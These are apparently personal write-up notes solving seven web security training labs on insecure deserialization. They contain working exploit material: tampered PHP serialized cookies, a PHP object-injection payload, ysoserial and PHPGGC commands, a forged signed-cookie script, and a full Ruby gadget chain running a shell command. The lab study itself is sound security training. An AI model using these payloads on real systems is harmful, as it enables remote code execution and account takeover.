### 1. Lab: Modifying serialized objects
> This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user `carlos`.
You can log in to your own account using the following credentials: `wiener:peter`

In this application, the cookie is based on serialization. So if we change the value for admin from `0` to `1` and change that cookie in browser, we can able to access admin panel.
![[Pasted image 20250831200142.png]]
On deleting carlos user, we can able to solve the lab.

### 2. Lab: Modifying serialized data types
> This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete the user `carlos`.
You can log in to your own account using the following credentials: `wiener:peter`

In this application, it is using serialized cookie where it has access token in order to show admin panel or not.
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"td8yghvm71g7isodhlyydipotgkcsn0t";}`
![[Pasted image 20250831201433.png]]
But sometimes, if there is a weak comparison in PHP like `==`, we can able to bypass that with by changing the datatype. We will compare access token with 0 and see if that works or not!
`O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
![[Pasted image 20250831201413.png]]
On changing the cookie in browser, it will redirect us to `/login` but we can able to access admin panel. 

### 3. Lab: Using application functionality to exploit insecure deserialization
> This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`
You also have access to a backup account: `gregg:rosebud`

This application have profile image path in serialized cookie, so if we delete account, it will also delete path located in `avatar_link`, so in order to delete a file from carlos's directory, we will replace that path and send the request to solve the lab.
```json
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"roiaho63xcl9jnso5577p7xmr4t16yw8";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

### 4. Lab: Arbitrary object injection in PHP
> This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials: `wiener:peter`

When we check the source code of the application, we got a path to PHP file. By adding `~` to the filename, we can able to read the source code
![[Pasted image 20250831203215.png]]
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
There is a function `__destruct` which will unlink the file. Now instead of user's serialized cookie: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"b5zuobushusnbom91vjdfegxxsk51bbn";}` we will make a new cookie that will use `CustomTemplate` to unlink the file.
New cookie will be:
```json
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
Although, this is not a valid user cookie, it will deserialize and execute before giving error, so it will delete the file and give the error. So The `__destruct()` magic method is automatically invoked and will delete Carlos's file.

### 5. Lab: Exploiting Java deserialization with Apache Commons
> This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.
To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`

We will use in order to generate payload.
- `java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64`
Or this in git bash
- `java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.compiler=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.dom=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w0`
Changing the cookie value and URL encoding it will solve the lab.
![[Pasted image 20250831210212.png]]

### 6. Lab: Exploiting PHP deserialization with a pre-built gadget chain
> This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.
To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

From the source code, we can able to get this file `/cgi-bin/phpinfo.php` and in that file, there is `SECRET_KEY` leaked in environment.
Using `PHPGGC` we can get the Base64-encoded serialized object `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`

You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
- Assign the object you generated in PHPGGC to the `$object` variable.
- Assign the secret key that you copied from the `phpinfo.php` file to the `$secretKey` variable.
```php
<?php 
$object = "OBJECT-GENERATED-BY-PHPGGC"; 
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"; 
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}'); 
echo $cookie;`
```
This will output a valid, signed cookie to the console. Replace session cookie with the malicious one you just created, then send the request to solve the lab.

### 7. Lab: Exploiting Ruby deserialization using a documented gadget chain
> This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: wiener:peter

1. Log in to your own account and notice that the session cookie contains a serialized ("marshaled") Ruby object. Send a request containing this session cookie to Burp Repeater.
2. Browse the web to find the `Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`. Copy the final script for generating the payload.
```ruby
# Autoload the required classes
require 'base64'
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```
Replace cookie to this one and it will solve the lab.